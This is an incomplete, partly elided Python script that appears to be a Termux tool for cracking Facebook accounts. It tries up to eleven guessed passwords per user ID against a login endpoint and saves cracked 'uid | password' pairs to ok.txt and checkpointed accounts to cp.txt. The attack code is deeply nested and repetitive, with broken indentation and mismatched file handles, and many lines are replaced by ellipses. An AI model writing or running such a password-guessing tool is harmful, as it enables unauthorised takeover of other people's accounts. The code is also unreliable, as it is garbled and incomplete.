...
try:
    ...
    os.system("python2 hasii.py")
os.system("clear")
"""
try:
    my = requests.get("https://www.facebook.com/Malik.Hassan")
...
if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    ...
    os.system("xdg-open https://www.facebook.com/Malik.Hassan")
    time.sleep(10)
agents = [
...
\033[1;36m(*) Fb     :\033[1;37m https://www.facebook.com/Malik.Hassan
\033[1;37m-----------------------------------------------
"""
def login():
    os.system("clear")
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass1+"\x1b[1;37m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;3m[Successfull]"+uid+" | "+pass2)
		                ok=open("cp.txt","a")
		                ok.write(uid+" | "+pass2+"\n")
		                ok.close()
		                oks.append(uid)
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass2+"\x1b[1;37m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass3+"\x1b[1;37m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;3m[Successfull]"+uid+" | "+pass4)
		                                ok=open("cp.txt","a")
		                                ok.write(uid+" | "+pass4+"\n")
		                                ok.close()
		                                oks.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;32m[Successfull Hasii] \033[1;32m"+uid+" | "+pass5)
		                                        ok=open("cp.txt","a")
		                                        ok.write(uid+" | "+pass5+"\n")
		                                        ok.close()
		                                        oks.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass5+"\x1b[1;37m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;32m[Successfull Hasii] \033[1;32m"+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass6+"\x1b[1;37m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;3m[Successful Hasii]"+uid+" | "+pass7)
		                                                        ok=open("cp.txt","a")
		                                                        ok.write(uid+" | "+pass7+"\n")
		                                                        ok.close()
		                                                        oks.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass7+"\x1b[1;37m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                            ...
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                 print("\x1b[1;32m[Successfull Hasii]"+uid+" | "+pass8)
		                                                                 ok=open("cp.txt","a")
		                                                                 ok.write(uid+" | "+pass8+"\n")
		                                                                 ok.close()
		                                                                 oks.append(uid)
		                                                                ...
		                                                                if 'access_token' in d:
		                                                                    print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass8+"\x1b[1;37m")
		                                                                    ok=open("ok.txt","a")
		                                                                    ok.write(uid+" | "+pass8+"\n")
		                                                                    ok.close()
		                                                                    oks.append(uid)
		                                                                    ...
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;32m[Successfull Hasii] \033[1;32m"+uid+" | "+pass9)
		                                                                        ok=open("cp.txt","a")
		                                                                        ok.write(uid+" | "+pass9+"\n")
		                                                                        ok.close()
		                                                                        oks.append(uid)
		                                                                        ...
		                                                                        if 'access_token' in d:
		                                                                            print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass9+"\x1b[1;37m")
		                                                                            ok=open("ok.txt","a")
		                                                                            ok.write(uid+" | "+pass9+"\n")
		                                                                            ok.close()
		                                                                            oks.append(uid)
		                                                                            ...
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;3m[Successfull Hasii]"+uid+" | "+pass10)
		                                                                                ok=open("cp.txt","a")
		                                                                                ok.write(uid+" | "+pass10+"\n")
		                                                                                ok.close()
		                                                                                oks.append(uid)
		                                                                                ...
		                                                                                if 'access_token' in d:
		                                                                                    print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass10+"\x1b[1;37m")
		                                                                                    ok=open("ok.txt","a")
		                                                                                    ok.write(uid+" | "+pass10+"\n")
		                                                                                    ok.close()
		                                                                                    oks.append(uid) 
		                                                                                    ...
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;32m[Successfull Hasii] \033[1;32m"+uid+" | "+pass11)
		                                                                                        ok=open("cp.txt","a")
		                                                                                        ok.write(uid+" | "+pass11+"\n")
		                                                                                        ok.close()
		                                                                                        oks.append(uid)
		                                                                                        ...
		                                                                                        if 'access_token' in d:
		                                                                                            print("\x1b[1;32m[Ok] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
		                                                                                            ok=open("ok.txt","a")
		                                                                                            ok.write(uid+" | "+pass11+"\n")
		                                                                                            ok.close()
		                                                                                            oks.append(uid)                                                
